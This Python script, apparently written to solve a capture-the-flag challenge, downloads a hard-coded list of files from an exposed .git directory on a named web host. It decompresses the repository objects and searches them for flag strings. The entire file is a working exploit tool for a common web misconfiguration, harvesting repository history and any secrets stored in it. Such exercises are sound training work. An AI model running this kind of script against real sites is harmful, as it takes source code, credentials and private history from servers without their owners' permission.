#!/usr/bin/env python3
import os
import requests
import zlib
import re

# Base URL of the exposed .git directory
BASE_URL = "http://c5.0hl.cc/.git/"

# List of file paths from the .git directory
GIT_FILES = [
    "hooks/update.sample",
    "hooks/pre-push.sample",
    "hooks/post-update.sample",
    "hooks/fsmonitor-watchman.sample",
    "hooks/commit-msg.sample",
    "hooks/pre-merge-commit.sample",
    "hooks/pre-rebase.sample",
    "hooks/push-to-checkout.sample",
    "hooks/applypatch-msg.sample",
    "hooks/pre-applypatch.sample",
    "hooks/prepare-commit-msg.sample",
    "hooks/pre-commit.sample",
    "hooks/pre-receive.sample",
    "info/exclude",
    "objects/88/9b09d697ad44417576e452438ea5a38123efa4",
    "objects/30/1e5f17a847d47d4b52c7fda63f232578137f21",
    "objects/1c/ae10ab0cbd6a604fd8bdf7cf2513aefd862873",
    "objects/21/f9afb01ac8481b52e895da845f246ad9d689c6",
    "objects/5c/76c48cd7e3b34112730e81cb245102cf4aef18",
    "objects/bb/fab62b69ddbd15a0115bd083ce7c96651bbca7",
    "objects/8c/7c34319fa6c96d334b0ce2c51aa17ba41fa7b7",
    "objects/9d/c1592e040190ed3e691253db6a692c7f49784e",
    "objects/3d/9da8acdb30f75c5146905c837217e782b9a2d4",
    "objects/6e/570f7a7b67b0fd922a0324e87787abd2a7c1ad",
    "objects/d0/52d0f4d9b057a7af1837cd827f3e8df58dedad",
    "objects/e8/bd18e6f23fec598e2a8e942914fa02bfba2405",
    "objects/aa/afeb05e10aa404b862f57375b2c926b65a882b",
    "config",
    "index",
    "HEAD",
    "logs/refs/heads/master",
    "logs/HEAD",
    "refs/heads/master",
    "description",
    "COMMIT_EDITMSG",
]

OUTPUT_DIR = "git_repo"

def download_all():
    """Download all git files to local directory"""
    print("[*] Phase 1: Downloading all .git files...")
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    downloaded = []
    failed = []
    
    for file_path in GIT_FILES:
        url = BASE_URL + file_path
        local_path = os.path.join(OUTPUT_DIR, file_path)
        os.makedirs(os.path.dirname(local_path), exist_ok=True)

        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                with open(local_path, "wb") as f:
                    f.write(response.content)
                print(f"[+] Downloaded: {file_path}")
                downloaded.append(local_path)
            else:
                print(f"[-] Failed: {file_path} (Status: {response.status_code})")
                failed.append(file_path)
        except Exception as e:
            print(f"[-] Error downloading {file_path}: {e}")
            failed.append(file_path)
    
    print(f"\n[*] Downloaded: {len(downloaded)} files")
    print(f"[*] Failed: {len(failed)} files")
    return downloaded

def search_in_files(file_list):
    """Search through all downloaded files for PRJBLK"""
    print("\n[*] Phase 2: Searching for 'PRJBLK' in downloaded files...")
    
    found_flags = set()  # Use a set to avoid duplicates
    
    for file_path in file_list:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            # Check if it's a git object (zlib compressed)
            if "objects/" in file_path:
                try:
                    data = zlib.decompress(data)
                except:
                    pass
            
            # Search for flag pattern in binary
            pattern = rb'PRJBLK\{[^}]+\}'
            matches = re.findall(pattern, data)
            
            for match in matches:
                try:
                    flag = match.decode('utf-8', errors='ignore')
                    found_flags.add(flag)
                    print(f"\n[!] Found in: {file_path}")
                    print(f"  >>> FLAG: {flag}")
                except:
                    pass
                    
        except Exception as e:
            print(f"[-] Error reading {file_path}: {e}")
    
    return found_flags

def main():
    # Phase 1: Download all files
    downloaded_files = download_all()
    
    # Phase 2: Search for flags
    flags = search_in_files(downloaded_files)
    
    # Summary
    print("\n" + "="*60)
    print("[*] SEARCH COMPLETE")
    print("="*60)
    
    if flags:
        print(f"\n[+] Found {len(flags)} unique flags:")
        for flag in sorted(flags):
            print(f"  {flag}")
        
        # Save to file
        with open("found_flags.txt", "w") as f:
            for flag in sorted(flags):
                f.write(f"{flag}\n")
        print("\n[+] Flags saved to found_flags.txt")
    else:
        print("\n[-] No flags found in downloaded files")
    
    print(f"\n[*] All downloaded files are in: {OUTPUT_DIR}/")

if __name__ == "__main__":
    main()
